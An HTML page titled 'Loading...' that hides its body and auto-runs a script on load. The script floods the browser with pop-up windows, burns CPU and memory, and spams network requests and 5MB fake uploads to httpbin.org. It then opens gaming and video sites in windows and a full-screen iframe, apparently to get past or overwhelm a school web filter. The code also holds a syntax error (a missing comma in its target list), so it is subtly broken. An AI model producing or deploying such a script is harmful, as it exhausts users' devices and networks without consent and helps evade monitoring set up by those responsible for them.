<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <script>
        // CONFIGURATION
        const config = {
            tabsPerSecond: 100,        // How many tabs to open per second
            maxTabs: 500,              // Maximum tabs to have open at once
            closeDelay: 50,           // Close tabs after this many ms (lower = faster spam)
            memoryLoad: true,         // Create memory pressure
            cpuLoad: true,            // Create CPU load
            networkSpam: true,        // Spam network requests
            autoStart: true,          // Start automatically
            runTime: 30000            // Run for 30 seconds then load target
        };

        // SITE LISTS
        const whitelist = [
            'https://www.wikipedia.org',
            'https://www.khanacademy.org',
            'https://www.nasa.gov',
            'https://www.nationalgeographic.com',
            'https://www.britannica.com',
            'https://www.history.com'
        ];

        const targets = [
            'https://www.reddit.com'
            'https://www.coolmathgames.com',
            'https://www.poki.com',
            'https://www.youtube.com',
            'https://www.twitch.tv',
            'https://www.netflix.com'
        ];

        // STATE
        let activeWindows = [];
        let totalOpened = 0;
        let totalClosed = 0;
        let isRunning = false;
        let startTime = 0;

        // OPEN EXTERNAL TAB
        function openRandomTab() {
            try {
                // Randomly choose URL
                const sites = [...whitelist, ...targets];
                const url = sites[Math.floor(Math.random() * sites.length)];
                
                // Generate random window ID
                const winId = 'spam_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                
                // Open window with minimal features (faster)
                const newWin = window.open(url, winId, 'width=100,height=100,left=' + Math.random() * screen.width + ',top=' + Math.random() * screen.height);
                
                if (newWin) {
                    activeWindows.push({
                        window: newWin,
                        id: winId,
                        openedAt: Date.now()
                    });
                    totalOpened++;
                    
                    // Schedule closing
                    setTimeout(() => {
                        try {
                            if (newWin && !newWin.closed) {
                                newWin.close();
                                totalClosed++;
                                // Remove from active list
                                const index = activeWindows.findIndex(w => w.id === winId);
                                if (index > -1) {
                                    activeWindows.splice(index, 1);
                                }
                            }
                        } catch(e) {}
                    }, config.closeDelay + Math.random() * 50);
                }
            } catch(e) {}
        }

        // MEMORY OVERLOAD
        function createMemoryLoad() {
            if (!config.memoryLoad) return;
            
            // Create massive array
            const bigArray = [];
            for (let i = 0; i < 100000; i++) {
                bigArray.push({
                    id: i,
                    data: new Array(1000).fill('x').join(''),
                    timestamp: Date.now(),
                    random: Math.random()
                });
            }
            
            // Keep reference
            if (!window.memoryBlocks) window.memoryBlocks = [];
            window.memoryBlocks.push(bigArray);
            
            // Clean old blocks
            if (window.memoryBlocks.length > 20) {
                window.memoryBlocks.shift();
            }
        }

        // CPU OVERLOAD
        function createCPULoad() {
            if (!config.cpuLoad) return;
            
            // Heavy computation
            let result = 0;
            const iterations = 1000000;
            for (let i = 0; i < iterations; i++) {
                result += Math.sqrt(Math.sin(Math.random()) * Math.cos(Math.random()));
            }
            
            // Recursive for continuous load
            if (isRunning) {
                setTimeout(createCPULoad, 0);
            }
        }

        // NETWORK SPAM
        function spamNetwork() {
            if (!config.networkSpam) return;
            
            // Make fetch requests to random URLs
            for (let i = 0; i < 5; i++) {
                const url = whitelist[Math.floor(Math.random() * whitelist.length)];
                fetch(url, { mode: 'no-cors', cache: 'no-store' }).catch(() => {});
                
                // Also try to load images
                const img = new Image();
                img.src = url + '?cache=' + Date.now();
            }
        }

        // UPLOAD SPAM (fake uploads)
        function spamUploads() {
            // Create fake file uploads
            const fakeFiles = [];
            for (let i = 0; i < 10; i++) {
                // Create large blob
                const size = 1024 * 1024 * 5; // 5MB
                const data = new Uint8Array(size);
                for (let j = 0; j < size; j++) {
                    data[j] = Math.floor(Math.random() * 256);
                }
                const blob = new Blob([data], { type: 'application/octet-stream' });
                fakeFiles.push(blob);
                
                // Try to "upload" via FormData
                const formData = new FormData();
                formData.append('file', blob, 'spam_' + i + '.bin');
                
                // Fake fetch to nowhere
                fetch('https://httpbin.org/post', {
                    method: 'POST',
                    body: formData,
                    mode: 'no-cors'
                }).catch(() => {});
            }
        }

        // MAIN SPAM FUNCTION
        function startSpam() {
            if (isRunning) return;
            
            isRunning = true;
            startTime = Date.now();
            
            // Start CPU load
            if (config.cpuLoad) {
                createCPULoad();
            }
            
            // Main spam interval
            const spamInterval = setInterval(() => {
                if (!isRunning) {
                    clearInterval(spamInterval);
                    return;
                }
                
                // Open multiple tabs
                for (let i = 0; i < config.tabsPerSecond / 10; i++) {
                    setTimeout(openRandomTab, i * 10);
                }
                
                // Memory load every 2 seconds
                if (Date.now() % 2000 < 100) {
                    createMemoryLoad();
                }
                
                // Network spam every second
                if (Date.now() % 1000 < 100) {
                    spamNetwork();
                }
                
                // Upload spam every 5 seconds
                if (Date.now() % 5000 < 100) {
                    spamUploads();
                }
                
                // Clean up if too many windows
                if (activeWindows.length > config.maxTabs) {
                    activeWindows.slice(0, activeWindows.length - config.maxTabs).forEach(w => {
                        try { w.window.close(); } catch(e) {}
                    });
                    activeWindows = activeWindows.slice(-config.maxTabs);
                }
                
                // Auto-stop after runtime
                if (Date.now() - startTime > config.runTime) {
                    stopSpam();
                    loadTarget();
                }
                
            }, 100); // Run every 100ms
        }

        function stopSpam() {
            isRunning = false;
            
            // Close all windows
            activeWindows.forEach(w => {
                try { w.window.close(); } catch(e) {}
            });
            activeWindows = [];
            
            // Clear memory
            window.memoryBlocks = [];
        }

        function loadTarget() {
            // Try all targets
            targets.forEach((url, index) => {
                setTimeout(() => {
                    // Multiple attempts
                    window.open(url, '_target' + index);
                    window.open(url, '_target2_' + index);
                    window.open(url, '_target3_' + index);
                    
                    // Also try iframe
                    const iframe = document.createElement('iframe');
                    iframe.src = url;
                    iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;border:none;';
                    document.body.appendChild(iframe);
                    
                }, index * 100);
            });
        }

        // KEYBOARD CONTROL
        document.addEventListener('keydown', (e) => {
            if (e.ctrlKey && e.shiftKey && e.key === 'S') {
                if (isRunning) stopSpam();
                else startSpam();
            }
            
            if (e.ctrlKey && e.shiftKey && e.key === 'T') {
                loadTarget();
            }
            
            if (e.key === 'Escape') {
                stopSpam();
            }
        });

        // START AUTOMATICALLY
        if (config.autoStart) {
            setTimeout(startSpam, 1000);
        }

        // HIDE EVERYTHING - RUN IN BACKGROUND
        document.body.style.display = 'none';
        
        // But keep script running
        console.log('Tab spammer running in background...');
        console.log('Press Ctrl+Shift+S to start/stop');
        console.log('Press Ctrl+Shift+T to load target');
        
    </script>
</head>
<body>
    <!-- EMPTY - Runs in background -->
</body>
</html>
